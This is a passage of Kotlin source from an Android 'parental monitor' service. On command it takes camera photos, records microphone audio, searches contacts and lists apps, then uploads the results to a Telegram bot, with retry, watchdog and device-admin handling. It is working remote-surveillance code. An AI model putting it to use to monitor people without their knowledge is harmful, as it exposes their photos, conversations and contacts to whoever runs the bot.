        if (authBlocked()) {
            serviceScope.launch {
                if (reportResult) {
                    sendToTelegram("Auth ditolak, foto ditunda sampai token diperbaiki di Setup.")
                }
            }
            return
        }
        if (pendingPhotoCount() >= 10) {
            try {
                prunePhotoCache(9)
            } catch (_: Exception) {
            }
            if (pendingPhotoCount() >= 10) {
                serviceScope.launch {
                    if (reportResult) {
                        sendToTelegram("⚠️ Photo backlog full (offline). Oldest unsent kept; newest capture skipped.")
                    } else {
                        notifyCameraFailure("photo backlog full")
                    }
                }
                return
            }
        }
        if (!hasCameraPermission()) {
            serviceScope.launch {
                if (reportResult) {
                    sendToTelegram("⚠️ Photo capture failed: camera permission missing. Open Setup and grant Camera permission.")
                } else {
                    notifyCameraFailure("camera permission missing")
                }
            }
            return
        }
        if (isCameraDisabledByPolicy()) {
            serviceScope.launch {
                if (reportResult) {
                    sendToTelegram("⚠️ Photo capture failed: camera disabled by device policy (CAMERA_DISABLED). " + cameraFailureHint("CAMERA_DISABLED"))
                } else {
                    notifyCameraFailure("camera disabled by device policy (CAMERA_DISABLED)")
                }
            }
            return
        }
        if (!cameraBusy.compareAndSet(false, true)) {
            if (reportResult) {
                serviceScope.launch {
                    sendToTelegram("⚠️ Camera is busy, please try /photo again in a moment.")
                }
            }
            return
        }
        watchdogJob?.cancel()
        val attempt = cameraAttempt.incrementAndGet()
        val wd = serviceScope.launch {
            delay(35_000)
            if (cameraAttempt.get() == attempt && cameraBusy.compareAndSet(true, false)) {
                android.util.Log.w("MonitoringService", "Camera watchdog: capture did not finish, flag reset")
                try {
                    cameraService.forceReset()
                } catch (_: Exception) {
                }
                if (reportResult) {
                    sendToTelegram("⚠️ Photo capture timed out without a response. Please try /photo again.")
                }
            }
        }
        watchdogJob = wd
        try {
            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "📸 Starting camera capture...")
            cameraService.capturePhoto(
                lensFacing = selectedLensFacing(),
                onPhotoTaken = { photoFile ->
                    if (cameraAttempt.get() != attempt) return@capturePhoto
                    cameraAttempt.incrementAndGet()
                    cameraBusy.set(false)
                    try {
                        wd.cancel()
                    } catch (_: Exception) {
                    }
                    serviceScope.launch {
                        val sent = sendPhotoFile(photoFile)
                        if (sent) {
                            flushPendingPhotos()
                        } else {
                            prunePhotoCache()
                            if (reportResult) {
                                sendToTelegram("⚠️ Photo captured but upload failed. File kept for retry.")
                            }
                        }
                    }
                },
                onError = { exception ->
                    if (cameraAttempt.get() != attempt) return@capturePhoto
                    cameraAttempt.incrementAndGet()
                    cameraBusy.set(false)
                    try {
                        wd.cancel()
                    } catch (_: Exception) {
                    }
                    android.util.Log.e("MonitoringService", "✗ Camera capture failed: ${exception.message}")
                    serviceScope.launch {
                        if (reportResult) {
                            sendToTelegram("⚠️ Photo capture failed: ${exception.message ?: "unknown error"}. " + cameraFailureHint(exception.message))
                        } else {
                            notifyCameraFailure(exception.message ?: "unknown error")
                        }
                    }
                }
            )
        } catch (e: Exception) {
            cameraAttempt.incrementAndGet()
            cameraBusy.set(false)
            watchdogJob?.cancel()
            android.util.Log.e("MonitoringService", "✗ Error in captureAndSendPhoto: ${redactToken(e.message)}")
            serviceScope.launch {
                if (reportResult) {
                    sendToTelegram("⚠️ Photo capture failed: ${e.message ?: "unknown error"}.")
                } else {
                    notifyCameraFailure(e.message ?: "unknown error")
                }
            }
        }
    }
    
    private suspend fun notifyCameraFailure(reason: String) {
        try {
            val now = System.currentTimeMillis()
            val last = preferencesManager.lastCameraErrorNotice
            if (last > 0 && last <= now && now - last < 30 * 60_000L) return
            preferencesManager.lastCameraErrorNotice = now
            sendToTelegram("⚠️ Photo capture failed: $reason. " + cameraFailureHint(reason))
        } catch (e: Exception) {
            android.util.Log.e("MonitoringService", "Error sending camera notice: ${redactToken(e.message)}")
        }
    }

    private suspend fun notifyPhotoSendFailure(detail: String) {
        try {
            val now = System.currentTimeMillis()
            val last = preferencesManager.lastUploadErrorNotice
            if (last > 0 && last <= now && now - last < 30 * 60_000L) return
            preferencesManager.lastUploadErrorNotice = now
            sendToTelegram("⚠️ Photo upload failed ($detail). Will retry automatically.")
        } catch (e: Exception) {
            android.util.Log.e("MonitoringService", "Error sending upload notice: ${redactToken(e.message)}")
        }
    }

    private fun hasMicPermission(): Boolean {
        return androidx.core.content.ContextCompat.checkSelfPermission(
            this,
            android.Manifest.permission.RECORD_AUDIO
        ) == android.content.pm.PackageManager.PERMISSION_GRANTED
    }

    private fun hasCameraPermission(): Boolean {
        return androidx.core.content.ContextCompat.checkSelfPermission(
            this,
            android.Manifest.permission.CAMERA
        ) == android.content.pm.PackageManager.PERMISSION_GRANTED
    }

    private fun isCameraPolicyError(reason: String?): Boolean {
        if (reason == null) return false
        return reason.contains("CAMERA_DISABLED", ignoreCase = true) ||
            reason.contains("disabled by policy", ignoreCase = true) ||
            reason.contains("Camera error: 3")
    }

    private fun isCameraDisabledByPolicy(): Boolean {
        try {
            val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
            try {
                if (dpm.getCameraDisabled(null)) return true
            } catch (_: Exception) {
            }
            try {
                val admin = android.content.ComponentName(this, com.redeye.parentalmonitor.receiver.AdminReceiver::class.java)
                if (dpm.getCameraDisabled(admin)) return true
            } catch (_: Exception) {
            }
        } catch (_: Exception) {
            return false
        }
        return false
    }

    private fun cameraFailureHint(reason: String?): String {
        if (!hasCameraPermission()) return "Open Setup and grant Camera permission."
        if (isCameraPolicyError(reason) || isCameraDisabledByPolicy()) return "Camera is blocked by device policy (another admin app, work profile, or parental control disabled it). Check Settings > Security > Device admin apps, remove the camera restriction, or pause photos with /pause."
        return "The camera may be in use by another app."
    }

    private fun pendingPhotoCount(): Int {
        return try {
            cacheDir.listFiles { file ->
                file.isFile && file.name.startsWith("camera_") && file.name.endsWith(".jpg")
            }?.size ?: 0
        } catch (_: Exception) {
            0
        }
    }

    private fun restartAllLoops() {
        try {
            monitoringJob?.cancel()
        } catch (_: Exception) {
        }
        try {
            cameraJob?.cancel()
        } catch (_: Exception) {
        }
        try {
            commandJob?.cancel()
        } catch (_: Exception) {
        }
        idlePolls = 0
        refreshCreds()
        refreshLoopConfig()
        startPeriodicLoops()
        startCommandPolling()
    }
    private fun startLoopWatchdog() {
        try {
            loopWatchdogJob?.cancel()
        } catch (_: Exception) {
        }
        loopWatchdogJob = serviceScope.launch {
            while (isActive && loopWatchdogJob === coroutineContext[Job]) {
                try {
                    delay(300_000L)
                } catch (e: kotlinx.coroutines.CancellationException) {
                    throw e
                } catch (_: Exception) {
                    continue
                }
                try {
                    if (monitoringJob?.isActive != true || cameraJob?.isActive != true || commandJob?.isActive != true) {
                        android.util.Log.w("MonitoringService", "Loop watchdog: restarting dead loops")
                        restartAllLoops()
                        val now = android.os.SystemClock.elapsedRealtime()
                        if (now - loopWatchdogNoticeAt > 3_600_000L) {
                            loopWatchdogNoticeAt = now
                            sendToTelegram("\u267B\uFE0F Watchdog restarted dead loops.")
                        }
                    }
                } catch (e: kotlinx.coroutines.CancellationException) {
                    throw e
                } catch (e: Exception) {
                    android.util.Log.e("MonitoringService", "Loop watchdog error: ${redactToken(e.message)}")
                }
            }
        }
    }

    private suspend fun ringDevice(seconds: Int) {
        val audioManager = getSystemService(AUDIO_SERVICE) as android.media.AudioManager
        val stream = android.media.AudioManager.STREAM_ALARM
        val previous = try {
            audioManager.getStreamVolume(stream)
        } catch (_: Exception) {
            -1
        }
        preferencesManager.ringPrevVolume = previous
        preferencesManager.ringSavedAt = System.currentTimeMillis()
        var ringtone: android.media.Ringtone? = null
        try {
            try {
                audioManager.setStreamVolume(stream, audioManager.getStreamMaxVolume(stream), 0)
            } catch (_: Exception) {
            }
            val uri = android.media.RingtoneManager.getDefaultUri(android.media.RingtoneManager.TYPE_RINGTONE)
            ringtone = android.media.RingtoneManager.getRingtone(applicationContext, uri)
            ringtone?.play()
            sendToTelegram("\uD83D\uDD14 Ringing for $seconds s\u2026")
            kotlinx.coroutines.delay(seconds * 1000L)
            sendToTelegram("\uD83D\uDD14 Ring finished.")
        } catch (e: kotlinx.coroutines.CancellationException) {
            throw e
        } catch (e: Exception) {
            sendToTelegram("\u26A0\uFE0F Ring failed.")
        } finally {
            try {
                ringtone?.stop()
            } catch (_: Exception) {
            }
            try {
                if (previous >= 0) audioManager.setStreamVolume(stream, previous, 0)
            } catch (_: Exception) {
            }
            preferencesManager.ringPrevVolume = -1
            preferencesManager.ringSavedAt = 0L
        }
    }

    @Suppress("DEPRECATION")
    private suspend fun recordAndSendAudio(seconds: Int) {
        val audioFile = File(cacheDir, "audio_" + System.currentTimeMillis() + ".m4a")
        var recorder: android.media.MediaRecorder? = null
        var keepForRetry = false
        activeAudioFile = audioFile
        try {
            recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                android.media.MediaRecorder(this)
            } else {
                android.media.MediaRecorder()
            }
            recorder.setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
            recorder.setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4)
            recorder.setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC)
            recorder.setOutputFile(audioFile.absolutePath)
            recorder.prepare()
            recorder.start()
            kotlinx.coroutines.delay(seconds * 1000L)
            try {
                recorder.stop()
            } catch (_: Exception) {
            }
            if (sendAudioFile(audioFile)) {
                sendToTelegram("\uD83C\uDF99\uFE0F Audio sent (${seconds}s).")
                flushPendingAudio()
            } else {
                keepForRetry = true
                try {
                    flushPendingAudio()
                } catch (_: Exception) {
                }
                sendToTelegram("\u26A0\uFE0F Audio recorded but send failed. File kept for automatic retry.")
            }
        } catch (e: kotlinx.coroutines.CancellationException) {
            try { deleteQuietly(audioFile) } catch (_: Exception) { }
            throw e
        } catch (e: SecurityException) {
            try { deleteQuietly(audioFile) } catch (_: Exception) { }
            sendToTelegram("\u26A0\uFE0F Microphone permission missing. Open Setup and grant Microphone permission.")
        } catch (e: Exception) {
            try { deleteQuietly(audioFile) } catch (_: Exception) { }
            sendToTelegram("\u26A0\uFE0F Record failed.")
        } finally {
            try {
                recorder?.release()
            } catch (_: Exception) {
            }
            activeAudioFile = null
            if (!keepForRetry) {
                try { if (audioFile.exists() && audioFile.length() == 0L) deleteQuietly(audioFile) } catch (_: Exception) { }
            }
            pruneAudioCache(MAX_AUDIO_KEPT)
        }
    }

    private suspend fun sendAudioFile(audioFile: File): Boolean {
        try {
            if (authBlocked()) return false
            if (!hasNetwork()) return false
            val (botToken, chatId) = sendCreds()
            if (botToken.isEmpty() || chatId.isEmpty()) return false
            val requestFile = audioFile.asRequestBody("audio/mp4".toMediaTypeOrNull())
            val audioPart = MultipartBody.Part.createFormData("audio", audioFile.name, requestFile)
            val chatIdBody = chatId.toRequestBody("text/plain".toMediaTypeOrNull())
            val caption = ("\uD83C\uDF99\uFE0F " + TimeFmt.full(System.currentTimeMillis())).toRequestBody("text/plain".toMediaTypeOrNull())
            val url = "https://api.telegram.org/bot$botToken/sendAudio"
            val response = TelegramClient.api.sendAudio(url, chatIdBody, caption, audioPart)
            if (response.isSuccessful && response.body()?.ok == true) {
                preferencesManager.lastSyncTime = System.currentTimeMillis()
                deleteQuietly(audioFile)
                return true
            }
            if (response.code() == 401 || response.code() == 403) {
                try {
                    preferencesManager.credentialError = response.code().toString()
                    preferencesManager.credentialErrorAt = android.os.SystemClock.elapsedRealtime()
                } catch (_: Exception) {
                }
            } else if (response.code() == 400) {
                android.util.Log.w("MonitoringService", "Audio rejected (400), dropping file")
                deleteQuietly(audioFile)
            }
            return false
        } catch (e: Exception) {
            return false
        }
    }

    private suspend fun flushPendingAudio(max: Int = 5) {
        if (authBlocked()) return
        if (!audioFlushBusy.compareAndSet(false, true)) return
        try {
            if (!hasNetwork()) return
            val pending = try {
                cacheDir.listFiles { file ->
                    file.isFile && file.name.startsWith("audio_") && file.name.endsWith(".m4a")
                }?.sortedBy { it.lastModified() }?.take(max) ?: return
            } catch (e: Exception) {
                return
            }
            val now = System.currentTimeMillis()
            for (file in pending) {
                if (file == activeAudioFile) continue
                if (now - file.lastModified() < 10_000L) continue
                sendAudioFile(file)
                if (file.exists()) break
                kotlinx.coroutines.delay(500)
            }
        } finally {
            audioFlushBusy.set(false)
            pruneAudioCache(MAX_AUDIO_KEPT)
        }
    }

    private fun pruneAudioCache(maxKept: Int) {
        try {
            val files = cacheDir.listFiles { file ->
                file.isFile && file.name.startsWith("audio_") && file.name.endsWith(".m4a")
            }?.sortedBy { it.lastModified() } ?: return
            files.dropLast(maxKept).forEach { deleteQuietly(it) }
        } catch (_: Exception) {
        }
    }

    private fun searchContacts(query: String): List<Pair<String, String>> {
        val out = mutableListOf<Pair<String, String>>()
        try {
            val uri = android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI
            val projection = arrayOf(
                android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER
            )
            val escaped = query.replace("\\", "\\\\").replace("%", "\\%").replace("_", "\\_")
            val cursor = contentResolver.query(
                uri,
                projection,
                android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " LIKE ? ESCAPE '\\'",
                arrayOf("%$escaped%"),
                android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            )
            cursor?.use { c ->
                val nameIdx = c.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val numIdx = c.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER)
                if (nameIdx >= 0 && numIdx >= 0) {
                    while (c.moveToNext() && out.size < 10) {
                        try {
                            out.add((c.getString(nameIdx) ?: "") to (c.getString(numIdx) ?: ""))
                        } catch (_: Exception) {
                        }
                    }
                }
            }
        } catch (_: Exception) {
        }
        return out
    }

    private fun listLaunchableApps(limit: Int): List<String> {
        return try {
            val intent = android.content.Intent(android.content.Intent.ACTION_MAIN).addCategory(android.content.Intent.CATEGORY_LAUNCHER)
            val infos = if (android.os.Build.VERSION.SDK_INT >= 33) {
                packageManager.queryIntentActivities(intent, android.content.pm.PackageManager.ResolveInfoFlags.of(0))
            } else {
                packageManager.queryIntentActivities(intent, 0)
            }
            infos.mapNotNull { r ->
                try {
                    val label = r.loadLabel(packageManager)?.toString() ?: return@mapNotNull null
                    val pkg = try {
                        r.activityInfo?.packageName
                    } catch (_: Exception) {
                        null
                    } ?: return@mapNotNull null
                    label to pkg
                } catch (_: Exception) {
                    null
                }
            }.distinctBy { it.second }.sortedBy { it.first.lowercase(java.util.Locale.ROOT) }.take(limit).map { it.first }
        } catch (_: Exception) {
            emptyList()
        }
    }

    private fun cacheStats(): Pair<Long, Int> {
        var bytes = 0L
        var photos = 0
        try {
            for (file in cacheDir.walkTopDown()) {
                try {
                    if (file.isFile) {
                        bytes += file.length()
                        if (file.parent == cacheDir.absolutePath && file.name.startsWith("camera_") && file.name.endsWith(".jpg")) photos++
                    }
                } catch (_: Exception) {
                }
            }
        } catch (_: Exception) {
        }
        return bytes to photos
    }

    private fun formatBytes(bytes: Long): String {
        if (bytes < 1024) return "$bytes B"
        val kb = bytes / 1024.0
        if (kb < 1024) return String.format(java.util.Locale.US, "%.1f KB", kb)
        val mb = kb / 1024.0
        if (mb < 1024) return String.format(java.util.Locale.US, "%.1f MB", mb)
        return String.format(java.util.Locale.US, "%.2f GB", mb / 1024.0)
    }

    private suspend fun sendPhotoFile(photoFile: File): Boolean {
        try {
            if (authBlocked()) return false
            if (!hasNetwork()) {
                android.util.Log.w("MonitoringService", "No network - photo saved for later")
                return false
            }

            val (botToken, chatId) = sendCreds()

            if (botToken.isEmpty() || chatId.isEmpty()) {
                android.util.Log.e("MonitoringService", "Bot credentials missing")
                return false
            }

            val requestFile = photoFile.asRequestBody("image/jpeg".toMediaTypeOrNull())
            val photoPart = MultipartBody.Part.createFormData("photo", photoFile.name, requestFile)
            val chatIdBody = chatId.toRequestBody("text/plain".toMediaTypeOrNull())

            val timestamp = TimeFmt.full(System.currentTimeMillis())
            val caption = "📸 $timestamp".toRequestBody("text/plain".toMediaTypeOrNull())

            val url = "https://api.telegram.org/bot$botToken/sendPhoto"

            val response = TelegramClient.api.sendPhoto(url, chatIdBody, caption, photoPart)

            if (response.isSuccessful && response.body()?.ok == true) {
                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "✓ Photo sent successfully!")
                preferencesManager.lastSyncTime = System.currentTimeMillis()
                preferencesManager.lastPhotoTime = System.currentTimeMillis()
                deleteQuietly(photoFile)
                return true
            }
            val errorBody = try {
                response.errorBody()?.string()?.take(200) ?: ""
            } catch (e: Exception) {
                ""
            }
            if (response.code() == 429) {
                android.util.Log.w("MonitoringService", "Photo rate limited, keeping file for retry")
            } else if (response.code() == 401 || response.code() == 403) {
                android.util.Log.e("MonitoringService", "Photo auth rejected (${response.code()}), keeping file for retry")
                try {
                    preferencesManager.credentialError = response.code().toString()
                    preferencesManager.credentialErrorAt = android.os.SystemClock.elapsedRealtime()
                } catch (_: Exception) {
                }
            } else if (response.code() == 400) {
                android.util.Log.w("MonitoringService", "Photo rejected (400), dropping file")
                deleteQuietly(photoFile)
            } else {
                android.util.Log.e("MonitoringService", "✗ Failed to send photo: ${response.code()} $errorBody")
                notifyPhotoSendFailure("HTTP ${response.code()} $errorBody".trim())
            }
            return false
        } catch (e: kotlinx.coroutines.CancellationException) {
            throw e
        } catch (e: Exception) {
            android.util.Log.e("MonitoringService", "✗ Error sending photo to Telegram: ${redactToken(e.message)}")
            return false
        }
    }

    private suspend fun flushPendingPhotos(max: Int = 10) {
        val pending = try {
            cacheDir.listFiles { file ->
                file.isFile && file.name.startsWith("camera_") && file.name.endsWith(".jpg")
            }?.sortedBy { it.lastModified() }?.take(max) ?: return
        } catch (e: Exception) {
            return
        }
        for (file in pending) {
            sendPhotoFile(file)
            if (file.exists()) break
            kotlinx.coroutines.delay(500)
        }
        prunePhotoCache()
    }

    private fun deleteQuietly(file: File) {
        try {
            file.delete()
        } catch (_: Exception) {
        }
    }
    private fun prunePhotoCache(maxKept: Int = 10) {
        try {
            val photos = cacheDir.listFiles { file ->
                file.isFile && file.name.startsWith("camera_") && file.name.endsWith(".jpg")
            }?.sortedBy { it.lastModified() } ?: return
            photos.dropLast(maxKept).forEach { deleteQuietly(it) }
        } catch (e: Exception) {
            android.util.Log.e("MonitoringService", "Error pruning photo cache: ${redactToken(e.message)}")
        }
    }
}
